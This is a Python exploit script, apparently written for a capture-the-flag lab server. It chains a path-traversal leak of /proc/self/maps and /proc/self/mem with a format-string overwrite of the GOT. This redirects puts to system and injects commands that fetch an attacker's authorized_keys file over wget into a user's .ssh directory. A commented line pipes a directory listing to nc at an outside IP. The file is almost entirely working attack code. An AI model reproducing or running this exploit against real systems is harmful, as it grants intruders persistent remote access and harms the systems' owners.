import base64
import urllib
from struct import pack
from pwn import *

myip = "10.10.14.2"
host = "10.10.10.148"
got_base = ""
got_printf = ""
libc_printf = ""
libc_system = ""
got_puts = ""

def mapsExtract():

	cPrm = "GET"
	aPrm = "../../../../../proc/self/maps"
	rPrm = "Range: bytes=0-9999"
	payload = cPrm + " " + aPrm +  "\n" + rPrm + "\n"


	pwn = remote(host, 9999, level = 'error')
	pwn.sendline(payload + "\n")

	recv = pwn.recvline_contains("rw-p", "httpserver")
	# print recv
	
	return recv[:recv.find('-')]



def memExtract():

	cPrm = "GET"
	aPrm = "../../../../../proc/self/mem"
	rPrm = "Range: bytes=" + str(int(got_printf, 16)) + "-" + str(int(got_printf, 16) + 3)
	payload = cPrm + " " + aPrm +  "\n" + rPrm + "\n"


	pwn = remote(host, 9999, level = 'error')
	pwn.sendline(payload + "\n")

	recv = pwn.recvall()


	recv = recv.splitlines()[-1][::-1]
	return recv.encode('hex')
	

def exploitServ(comm):

	#remote f7e2 2d10        - memExtract - 13e50
	payload = ""
	fmt_first = libc_system[6:]
	fmt_second = libc_system[2:6]

	faddr = int(fmt_first, 16) -8
	saddr = int(fmt_second, 16) - int(fmt_first, 16)

	if(comm == 1):
		cPrm = "ping${IFS}-c${IFS}1${IFS}"+myip
	if(comm == 2):
		cPrm = "wget${IFS}http://" + myip +":8000/authorized_keys${IFS}-P${IFS}/home/john/.ssh/"
	if(comm == 3):
		cPrm = "chmod${IFS}600${IFS}/home/john/.ssh/authorized_keys"	

#cPrm = "ls${IFS}-la${IFS}/home/john/.ssh|nc${IFS}10.10.15.144${IFS}8088"

	aPrm = p32(int(got_puts, 16))
	aPrm += p32(int(got_puts, 16) + 2)
	aPrm += "%2553%24" + str(faddr) + "x"          # -8 
	aPrm += "%2553%24n" 
	aPrm += "%2554%24" + str(saddr) + "x"
	aPrm += "%2554%24n"
	payload = cPrm + " " + aPrm
	

	print "   + Executing step " + str(comm) + "..."
	pwn = remote("10.10.10.148", 9999, level = 'error')
	pwn.sendline(payload + "\n")

	recv = pwn.recvall()
	if "not found" in recv:
		print "      + Done"

	pwn.shutdown()
	pwn.close()


print "[*] Connecting to " + host
got_base = mapsExtract()
print "   + GOT Base Address = 0x" + got_base

got_printf = hex(int("0x"+got_base, 16) + 0x18)
print "[*] Extracting printf libc addr at: " + got_printf
libc_printf = memExtract()
print "   + LIBC printf addr = 0x" + libc_printf

print "[*] Exploiting..."
libc_system = hex(int("0x"+libc_printf, 16) - 0x13e50)
print "   + LIBC system addr = 0x" + libc_system
got_puts = hex(int("0x"+got_base, 16) + 0x48)
print "   + GOT puts addr = 0x" + got_puts
exploitServ(1)
sleep(3)
exploitServ(2)
print "[*] Ready to connect!"
